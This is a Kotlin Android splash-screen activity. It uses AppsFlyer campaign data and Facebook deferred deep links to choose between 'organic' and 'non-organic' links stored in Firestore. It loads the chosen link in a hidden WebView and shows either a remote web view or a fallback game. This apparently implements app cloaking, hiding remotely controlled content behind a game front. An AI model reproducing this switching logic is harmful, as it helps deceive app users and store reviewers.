package com.visoft.testwebview

import android.annotation.SuppressLint
import android.content.Intent
import android.graphics.Bitmap
import android.net.Uri
import android.os.Bundle
import android.util.Log
import android.webkit.CookieManager
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.appcompat.app.AppCompatActivity
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.facebook.FacebookSdk
import com.facebook.applinks.AppLinkData
import com.google.firebase.firestore.ktx.firestore
import com.google.firebase.ktx.Firebase
import com.visoft.testwebview.Utils.nakedLinkToFinalLink
import com.visoft.testwebview.databinding.ActivitySplashBinding
import com.visoft.testwebview.repository.PreferenceRepository
import com.visoft.testwebview.repository.PreferenceRepositoryImpl
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

@SuppressLint("CustomSplashScreen")
class SplashActivity: AppCompatActivity() {

    private var bind: ActivitySplashBinding? = null

    private var preferenceRepository: PreferenceRepository? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        bind = ActivitySplashBinding.inflate(layoutInflater)
        setContentView(bind?.root)

        preferenceRepository = PreferenceRepositoryImpl(this)
        CoroutineScope(Dispatchers.IO).launch {

            if(preferenceRepository?.getFirstVisit() == true) {
                checkAppsFlyer()
                delay(1000 * 9)
                checkFacebook()
            } else if(preferenceRepository?.getFinalLink() != "") {
                startViewActivity()
            }else{
                loadLinks()
            }
        }
    }

    private suspend fun checkFacebook() {
        FacebookSdk.setClientToken(getString(R.string.facebook_client_token))
        FacebookSdk.setApplicationId(getString(R.string.facebook_application_id))

        FacebookSdk.setAutoInitEnabled(true)
        FacebookSdk.sdkInitialize(this)

        AppLinkData.fetchDeferredAppLinkData(this) {
            if(it != null) {
                CoroutineScope(Dispatchers.IO).launch {
                    preferenceRepository?.saveDeeplink(it.targetUri.toString())
                }
            }
            CoroutineScope(Dispatchers.IO).launch {
                loadLinks()
            }
        }
    }

    private suspend fun checkAppsFlyer() {
        val appsFlyer = AppsFlyerLib.getInstance()

        appsFlyer.init("APPSFLYER_AP_ID", object: AppsFlyerConversionListener {
            override fun onConversionDataSuccess(p0: MutableMap<String, Any>?) {
                try {
                    if(p0 != null) {
                        runOnUiThread {
                            val campaign = (p0["c"] ?: "") as String
                            if(campaign != "") {
                                CoroutineScope(Dispatchers.IO).launch {
                                    preferenceRepository?.saveCompany(campaign)
                                }
                            }
                        }
                    }
                } catch(ex: Exception) { }
            }

            override fun onConversionDataFail(p0: String?) {}

            override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {}

            override fun onAttributionFailure(p0: String?) {}
        }, this)
    }

    private suspend fun loadLinks() = try {

        val company = preferenceRepository?.getCompany()
        val deeplink = preferenceRepository?.getDeeplink()

        val db = Firebase.firestore

        if(company != "" && deeplink != "") {
            db.collection(COLLECTIONS).document(DOCUMENT_NON_ORGANIC).get()
                    .addOnSuccessListener {
                        CoroutineScope(Dispatchers.IO).launch {
                            val rawLink = it.get(FIELD_LINK) as String?
                            if(rawLink != "" && rawLink != null){
                                loadData(rawLink)
                            }else
                                startGameActivity()
                        }
                    }.addOnFailureListener {
                        startGameActivity()
                    }
        } else {
            db.collection(COLLECTIONS).document(DOCUMENT_ORGANIC).get()
                    .addOnSuccessListener {
                        CoroutineScope(Dispatchers.IO).launch {
                            val rawLink = it.get(FIELD_LINK) as String?
                            if(rawLink != "" && rawLink != null){
                                loadData(rawLink)
                            }else
                                startGameActivity()
                        }
                    }.addOnFailureListener {
                        startGameActivity()
                    }

        }
    }catch(ex: Exception){
        startGameActivity()
    }

    private fun loadData(link: String) = CoroutineScope(Dispatchers.IO).launch {
        val webView = WebView(this@SplashActivity)

        val company = preferenceRepository?.getCompany()
        val deeplink = preferenceRepository?.getDeeplink()


        val finalLink: String = if(company != null && deeplink != null &&company != "" && deeplink != "" ) {
            nakedLinkToFinalLink(link, company, deeplink)
        }else{
            link.split("?")[0]
        }

        webView.apply {
            loadUrl(finalLink)
            CookieManager.getInstance().setAcceptCookie(true)
            CookieManager.getInstance().setAcceptThirdPartyCookies(this, true)
            CookieManager.getInstance().flush()
            CookieManager.getInstance().acceptCookie()

            webViewClient = object: WebViewClient() {

                override fun onPageStarted(view: WebView?, url: String?, favicon: Bitmap?) {
                    super.onPageStarted(view, url, favicon)

                    CookieManager.getInstance().setAcceptCookie(true)
                    CookieManager.getInstance().acceptCookie()
                    CookieManager.getInstance().flush()
                }

                override fun onPageFinished(view: WebView?, url: String?) {
                    super.onPageFinished(view, url)

                    CookieManager.getInstance().setAcceptCookie(true)
                    CookieManager.getInstance().acceptCookie()
                    CookieManager.getInstance().flush()

                    val host = Uri.parse(url.toString()).host
                    val hosts = Uri.parse(link).host

                    if(host != hosts) {
                        this@launch.launch {
                            preferenceRepository?.saveFinalLink(link)
                        }
                    } else runOnUiThread {
                        startGameActivity()
                    }
                }
            }
        }
    }

    private fun startViewActivity() {
        startActivity(Intent(this, ViewActivity::class.java))
        finish()
    }

    private fun startGameActivity() {
        startActivity(Intent(this, GameActivity::class.java))
        finish()
    }

    companion object {
        private const val COLLECTIONS = "LINK"

        private const val DOCUMENT_ORGANIC = "ORGANIC_LINK"
        private const val DOCUMENT_NON_ORGANIC = "NON_ORGANIC_LINK"

        private const val FIELD_LINK = "NON_ORGANIC_LINK"
    }
}